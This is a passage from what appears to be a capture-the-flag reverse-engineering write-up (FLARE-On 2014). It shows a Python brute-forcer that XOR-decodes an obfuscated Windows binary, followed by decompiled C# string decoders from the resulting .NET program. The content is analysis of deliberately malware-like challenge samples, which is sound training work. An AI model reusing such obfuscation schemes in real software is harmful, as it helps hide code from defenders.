                      &lt;span style=&#34;color: #719e07&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;index[&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;12&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color: #B58900&#34;&gt;xrange&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;):&lt;/span&gt;
                        &lt;span style=&#34;color: #719e07&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;index[&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;13&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color: #B58900&#34;&gt;xrange&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;):&lt;/span&gt;
                          &lt;span style=&#34;color: #719e07&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;index[&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;14&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color: #B58900&#34;&gt;xrange&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;):&lt;/span&gt;
                            &lt;span style=&#34;color: #93A1A1&#34;&gt;out&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;xor(out,key1[index[&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]])&lt;/span&gt;
                            &lt;span style=&#34;color: #93A1A1&#34;&gt;out&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;xor(out,key2[index[&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]])&lt;/span&gt;
                            &lt;span style=&#34;color: #93A1A1&#34;&gt;out&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;xor(out,key3[index[&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;3&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]])&lt;/span&gt;
                            &lt;span style=&#34;color: #93A1A1&#34;&gt;out&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;xor(out,key4[index[&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;4&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]])&lt;/span&gt;
                            &lt;span style=&#34;color: #93A1A1&#34;&gt;out&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;xor(out,key5[index[&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;5&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]])&lt;/span&gt;
                            &lt;span style=&#34;color: #93A1A1&#34;&gt;out&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;xor(out,key6[index[&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;6&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]])&lt;/span&gt;
                            &lt;span style=&#34;color: #93A1A1&#34;&gt;out&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;xor(out,key7[index[&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;7&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]])&lt;/span&gt;
                            &lt;span style=&#34;color: #93A1A1&#34;&gt;out&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;xor(out,key8[index[&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;8&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]])&lt;/span&gt;
                            &lt;span style=&#34;color: #93A1A1&#34;&gt;out&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;xor(out,key9[index[&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;9&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]])&lt;/span&gt;
                            &lt;span style=&#34;color: #93A1A1&#34;&gt;out&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;xor(out,key10[index[&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;10&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]])&lt;/span&gt;
                            &lt;span style=&#34;color: #93A1A1&#34;&gt;out&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;xor(out,key11[index[&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;11&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]])&lt;/span&gt;
                            &lt;span style=&#34;color: #93A1A1&#34;&gt;out&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;xor(out,key12[index[&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;12&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]])&lt;/span&gt;
                            &lt;span style=&#34;color: #93A1A1&#34;&gt;out&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;xor(out,key13[index[&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;13&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]])&lt;/span&gt;
                            &lt;span style=&#34;color: #93A1A1&#34;&gt;out&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;xor(out,key14[index[&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;14&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]])&lt;/span&gt;
                            
                            &lt;span style=&#34;color: #719e07&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;out[&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;==&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;#39;M&amp;#39;&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;and&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;out[&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;==&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;#39;Z&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;):&lt;/span&gt;
                              &lt;span style=&#34;color: #719e07&#34;&gt;print&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;Found it&amp;quot;&lt;/span&gt;
                              &lt;span style=&#34;color: #719e07&#34;&gt;print&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;out&lt;/span&gt;
                              &lt;span style=&#34;color: #719e07&#34;&gt;print&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;hexlify(out)&lt;/span&gt;
                          
                              &lt;span style=&#34;color: #93A1A1&#34;&gt;out&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;wholefile&lt;/span&gt;
                              
                              &lt;span style=&#34;color: #93A1A1&#34;&gt;out&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;xor(out,key1[ind1])&lt;/span&gt;
                              &lt;span style=&#34;color: #93A1A1&#34;&gt;out&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;xor(out,key2[ind2])&lt;/span&gt;
                              &lt;span style=&#34;color: #93A1A1&#34;&gt;out&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;xor(out,key3[ind3])&lt;/span&gt;
                              &lt;span style=&#34;color: #93A1A1&#34;&gt;out&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;xor(out,key4[ind4])&lt;/span&gt;
                              &lt;span style=&#34;color: #93A1A1&#34;&gt;out&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;xor(out,key5[ind5])&lt;/span&gt;
                              &lt;span style=&#34;color: #93A1A1&#34;&gt;out&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;xor(out,key6[ind6])&lt;/span&gt;
                              &lt;span style=&#34;color: #93A1A1&#34;&gt;out&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;xor(out,key7[ind7])&lt;/span&gt;
                              &lt;span style=&#34;color: #93A1A1&#34;&gt;out&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;xor(out,key8[ind8])&lt;/span&gt;
                              &lt;span style=&#34;color: #93A1A1&#34;&gt;out&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;xor(out,key9[ind9])&lt;/span&gt;
                              &lt;span style=&#34;color: #93A1A1&#34;&gt;out&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;xor(out,key10[ind10])&lt;/span&gt;
                              &lt;span style=&#34;color: #93A1A1&#34;&gt;out&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;xor(out,key11[ind11])&lt;/span&gt;
                              &lt;span style=&#34;color: #93A1A1&#34;&gt;out&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;xor(out,key13[ind13])&lt;/span&gt;
                              &lt;span style=&#34;color: #93A1A1&#34;&gt;out&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;xor(out,key14[ind14])&lt;/span&gt;
                              &lt;span style=&#34;color: #93A1A1&#34;&gt;out&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;xor(out,&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;#39;backdoge.exe&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt;
                          
                              &lt;span style=&#34;color: #93A1A1&#34;&gt;decodedfilename&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;c:&lt;/span&gt;&lt;span style=&#34;color: #CB4B16&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;gratz&amp;quot;&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color: #B58900&#34;&gt;str&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;(counter)&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;.exe&amp;quot;&lt;/span&gt;
                              &lt;span style=&#34;color: #93A1A1&#34;&gt;decodedfile&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #B58900&#34;&gt;file&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;(decodedfilename,&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;#39;wb&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt;
                              &lt;span style=&#34;color: #93A1A1&#34;&gt;decodedfile&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;write(out)&lt;/span&gt;
                              &lt;span style=&#34;color: #93A1A1&#34;&gt;decodedfile&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;close()&lt;/span&gt;
                                
                            &lt;span style=&#34;color: #586E75&#34;&gt;# be sure to reset the wholefile after reading it, thanks Curtis :)                                                                  &lt;/span&gt;
                            &lt;span style=&#34;color: #93A1A1&#34;&gt;out&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;wholefile[:&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0x10&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt;
                            &lt;span style=&#34;color: #93A1A1&#34;&gt;counter&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;+=&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;1&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;It&amp;rsquo;s a bad bruteforcer but it does the job. To speed things up, it only performs the xor-es with the first &lt;code&gt;0x80&lt;/code&gt; bytes of the binary which is the &lt;code&gt;DOS Stub&lt;/code&gt;. In the end, it compares the first two bytes with &lt;code&gt;MZ&lt;/code&gt; and then xor-es the whole binary before writing it to a file.&lt;/p&gt;

&lt;p&gt;I got two files and after opening them in hex editors, one was clearly a false positive. I executed the correct binary.&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://parsiya.net/images/2014/flare/7-23.jpg&#34; alt=&#34;Almost done&#34; title=&#34;Almost done&#34; /&gt;&lt;/p&gt;

&lt;p&gt;But we cannot see the email. Augh. This is a .NET application. We need to decompile it like the first challenge.&lt;/p&gt;

&lt;p&gt;


    

&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;Decompiled gratz.exe&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt; 
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt; 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #719e07&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;Form1&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;()&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;{&lt;/span&gt;
  &lt;span style=&#34;color: #719e07&#34;&gt;this&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;.InitializeComponent();&lt;/span&gt;
  &lt;span style=&#34;color: #719e07&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;Thread&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;ThreadStart(&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;this&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;.lulzors)).Start();&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;}&lt;/span&gt;

&lt;span style=&#34;color: #719e07&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;lulzors&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;()&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;{&lt;/span&gt;
  &lt;span style=&#34;color: #93A1A1&#34;&gt;lulz&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;lulz&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;lulz();&lt;/span&gt;
  &lt;span style=&#34;color: #93A1A1&#34;&gt;Thread&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;thread&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;Thread(&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;ThreadStart(lulz.datwork));&lt;/span&gt;
  &lt;span style=&#34;color: #93A1A1&#34;&gt;thread.Start();&lt;/span&gt;
  &lt;span style=&#34;color: #719e07&#34;&gt;do&lt;/span&gt;
    &lt;span style=&#34;color: #93A1A1&#34;&gt;;&lt;/span&gt;
  &lt;span style=&#34;color: #719e07&#34;&gt;while&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;(thread.IsAlive);&lt;/span&gt;
  &lt;span style=&#34;color: #719e07&#34;&gt;this&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;.label2.Text&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;lulz.decoder4(&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;\v\fP\x000E\x000FBA\x0006\rG\x0015I\x001A\x0001\x0016H\\\t\b\x0002\x0013/\b\t^\x001D\bJO\a]C\x001B\x0005&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;);&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;And inside &lt;code&gt;lulz.cs&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;


    

&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;lulz.cs&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt; 
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt; 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #586E75&#34;&gt;// decoder1 and decoder3 omitted&lt;/span&gt;

&lt;span style=&#34;color: #719e07&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color: #DC322F&#34;&gt;string&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;decoder2&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #DC322F&#34;&gt;string&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;encoded)&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;{&lt;/span&gt;
  &lt;span style=&#34;color: #DC322F&#34;&gt;string&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;str1&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;;&lt;/span&gt;
  &lt;span style=&#34;color: #DC322F&#34;&gt;string&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;str2&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;this&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;;&lt;/span&gt;
  &lt;span style=&#34;color: #719e07&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #DC322F&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;index&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;;&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;index&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;encoded.Length;&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;++index)&lt;/span&gt;
    &lt;span style=&#34;color: #93A1A1&#34;&gt;str1&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;str1&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #DC322F&#34;&gt;object&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #DC322F&#34;&gt;char&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;((&lt;/span&gt;&lt;span style=&#34;color: #DC322F&#34;&gt;uint&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;encoded[index]&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;^&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #DC322F&#34;&gt;uint&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;str2[index&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;str2.Length]);&lt;/span&gt;
  &lt;span style=&#34;color: #719e07&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;str1;&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;}&lt;/span&gt;

&lt;span style=&#34;color: #719e07&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color: #DC322F&#34;&gt;string&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;decoder4&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #DC322F&#34;&gt;string&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;encoded)&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;{&lt;/span&gt;
  &lt;span style=&#34;color: #DC322F&#34;&gt;string&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;str1&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;;&lt;/span&gt;
  &lt;span style=&#34;color: #DC322F&#34;&gt;string&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;str2&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;this&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;.decoder2(&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;\x001B\x0005\x000ES\x001D\x001BI\a\x001C\x0001\x001AS\0\0\fS\x0006\r\b\x001FT\a\a\x0016K&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;);&lt;/span&gt;
  &lt;span style=&#34;color: #719e07&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #DC322F&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;index&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;;&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;index&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;encoded.Length;&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;++index)&lt;/span&gt;
    &lt;span style=&#34;color: #93A1A1&#34;&gt;str1&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;str1&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #DC322F&#34;&gt;object&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #DC322F&#34;&gt;char&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;((&lt;/span&gt;&lt;span style=&#34;color: #DC322F&#34;&gt;uint&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: 